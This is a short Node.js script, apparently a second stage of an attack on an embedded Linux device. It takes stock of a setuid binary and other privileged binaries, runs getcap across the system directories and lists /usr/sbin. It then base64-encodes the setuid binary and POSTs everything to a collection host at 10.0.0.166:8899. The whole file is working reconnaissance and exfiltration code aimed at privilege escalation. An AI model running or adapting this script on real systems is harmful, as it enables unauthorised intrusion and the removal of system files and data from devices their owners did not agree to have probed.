// Stage-2 read-only recon: pull the setuid wasutility binary + check capability binaries.
var fs = require('fs');
var http = require('http');
var cp = require('child_process');
function ex(c) { try { return cp.execSync(c, { timeout: 8000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
function st(p) { try { var s = fs.statSync(p); return { uid: s.uid, gid: s.gid, mode: s.mode.toString(8), size: s.size }; } catch (e) { return null; } }
function b64(p) { try { return fs.readFileSync(p).toString('base64'); } catch (e) { return 'ERR ' + e.message; } }
var out = {};
out.wasutility = st('/usr/bin/wasutility');
out.dotnet = st('/usr/bin/dotnet');
out.tarlauncher = st('/usr/sbin/sdbd-tarlauncher');
out.getcap = ex('getcap -r /usr/bin /usr/sbin /bin /sbin 2>/dev/null');
out.sbin = ex('ls /usr/sbin');
out.wasutility_b64 = b64('/usr/bin/wasutility');
var body = JSON.stringify(out);
var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon2', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, function (r) { });
req.on('error', function (e) { });
req.write(body); req.end();
